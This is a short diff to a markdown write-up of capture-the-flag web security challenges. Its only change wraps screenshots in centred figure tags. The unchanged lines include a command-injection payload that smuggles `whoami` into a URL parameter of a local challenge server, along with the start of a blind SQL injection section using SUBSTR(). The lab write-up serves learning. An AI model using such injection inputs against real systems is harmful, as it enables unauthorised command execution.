@@ -485,9 +485,13 @@ curl "http://challenge.localhost:80/exercise?zone=`whoami`"
 TZ=`whoami` date  ==>  TZ=root date
 ```
 
+<figure style={{ textAlign: 'center' }}>
 ![image](https://github.com/Kunull/Write-ups/assets/110326359/e8bd69b6-6261-4df3-b7a5-4013c3a4e550)
+</figure>
 
+<figure style={{ textAlign: 'center' }}>
 ![image](https://github.com/Kunull/Write-ups/assets/110326359/5558b05c-23df-461d-9b37-9c5c92449089)
+</figure>
 
 ```
 hacker@web-security~cmdi-4:/$ curl "http://challenge.localhost:80/exercise?zone=`whoami`"
@@ -1595,7 +1599,9 @@ app.run("challenge.localhost", 80)
 #### Blind attack
 Before we perform the attack we need to learn more about the `SUBSTR()` function.
 
+<figure style={{ textAlign: 'center' }}>
 ![image](https://github.com/Kunull/Write-ups/assets/110326359/ec609e62-def0-46f2-b58a-cb7d332e11ca)
+</figure>
 
 ```
 ## Extract the one character from the string starting at the first position
